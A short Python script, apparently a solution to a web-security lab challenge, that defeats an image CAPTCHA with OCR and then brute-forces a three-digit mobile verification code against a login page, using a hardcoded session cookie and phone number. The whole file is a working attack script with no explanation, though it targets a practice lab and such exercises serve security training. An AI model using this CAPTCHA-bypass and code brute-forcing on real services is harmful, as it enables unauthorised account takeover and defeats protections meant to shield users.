#!/usr/bin/env python

import requests, pytesseract
from PIL import Image

s = requests.session()
header = {
'Cookie':'saeut=124.89.2.88.1434295791298139; PHPSESSID=29348af84ebeebec946a6d4cd6a11fae'
}
value = {
		'username':'13388886666',
		'mobi_code':123,
		'user_code':'',
}

def vcode():
	r = requests.get('http://lab1.xseclab.com/vcode7_f7947d56f22133dbc85dda4f28530268/vcode.php',headers=header)
	with open('vcode.png','wb') as f:
		f.write(r.content)
	im = pytesseract.image_to_string(Image.open('vcode.png'))
	im = im.replace(' ','')
	if unicode.isnumeric(im.decode('utf8')):
		return im
	else:
		return vcode()

for i in xrange(100,1000):
	value['user_code'] = vcode()
	value['mobi_code'] = i
	print(value)
	r = requests.post('http://lab1.xseclab.com/vcode7_f7947d56f22133dbc85dda4f28530268/login.php',headers=header,data=value)
	print(r.content)
